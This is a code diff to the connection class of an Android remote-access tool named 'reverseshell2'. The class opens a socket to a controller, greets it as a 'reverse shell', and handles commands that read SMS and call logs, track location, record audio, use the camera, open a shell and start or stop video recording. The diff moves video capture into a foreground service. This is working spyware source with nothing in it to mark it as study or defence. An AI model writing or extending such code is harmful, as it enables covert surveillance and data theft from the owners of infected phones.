@@ -8,6 +8,8 @@ import android.os.Build;
 import android.util.Log;
 
 
+import androidx.core.content.ContextCompat;
+
 import com.example.reverseshell2.Payloads.CameraPreview;
 import com.example.reverseshell2.Payloads.audioManager;
 import com.example.reverseshell2.Payloads.ipAddr;
@@ -43,6 +45,7 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
     static String TAG = "tcpConnectionClass";
     vibrate vibrate;
     readSMS readSMS;
+    public static OutputStream out;
     locationManager locationManager;
     audioManager audioManager;
     com.example.reverseshell2.Payloads.videoRecorder videoRecorder;
@@ -51,7 +54,6 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
 
     public tcpConnection(Activity activity, Context context) {
         this.activity = activity;
-        //this.view = view;
         this.context = context;
         functions = new functions(activity);
         mPreview = new CameraPreview(context);
@@ -59,10 +61,11 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
         readSMS = new readSMS(context);
         locationManager = new locationManager(context,activity);
         audioManager = new audioManager(context);
-        videoRecorder= new videoRecorder(context,activity);
+        videoRecorder= new videoRecorder();
         readCallLogs = new readCallLogs(context,activity);
         shell = new newShell(activity,context);
     }
+
 
     @Override
     protected Void doInBackground(String... strings) {
@@ -90,7 +93,7 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                     break;
                 }
             }
-            final OutputStream out = new DataOutputStream(socket.getOutputStream());
+            out = new DataOutputStream(socket.getOutputStream());
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             String model = android.os.Build.MODEL+"\n";
             String welcomeMess = "Hello there, welcome to reverse shell of "+model;
@@ -224,12 +227,17 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                 else if(line.matches("startVideo \\d"))
                 {
                     final String[] cameraid = line.split(" ");
-                    videoRecorder.startVideo(Integer.parseInt(cameraid[1]),out);
+                    Intent serviceIntent = new Intent(context, videoRecorder.class);
+                    serviceIntent.putExtra("ins", "startFore");
+                    serviceIntent.putExtra("cameraid", cameraid[1]);
+                    ContextCompat.startForegroundService(context, serviceIntent);
+
                 }
                 else if(line.equals("stopVideo"))
                 {
-
-                    videoRecorder.videoStop(out);
+                    Intent serviceIntent = new Intent(context, videoRecorder.class);
+                    serviceIntent.putExtra("ins","stopFore");
+                    ContextCompat.startForegroundService(context,serviceIntent);
                 }
                 else if(line.equals("getCallLogs"))
                 {
